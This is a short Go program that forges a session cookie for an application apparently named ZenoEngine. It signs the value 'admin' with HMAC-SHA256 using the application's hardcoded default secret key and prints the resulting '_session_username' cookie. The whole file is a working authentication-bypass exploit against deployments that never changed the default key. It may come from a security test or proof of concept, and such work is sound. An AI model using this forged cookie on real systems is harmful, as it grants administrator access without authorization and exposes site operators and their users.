package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/url"
)

func main() {
	key := []byte("zenoengine_default_secret_key_change_me_in_production")
	value := `"admin"` // ZenoEngine stores session value as JSON string, so "admin" is wrapped in quotes
	
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(value))
	sig := hex.EncodeToString(mac.Sum(nil))
	
	signed := value + "|" + sig
	escaped := url.QueryEscape(signed)
	
	fmt.Println("Cookie value:")
	fmt.Printf("_session_username=%s\n", escaped)
}
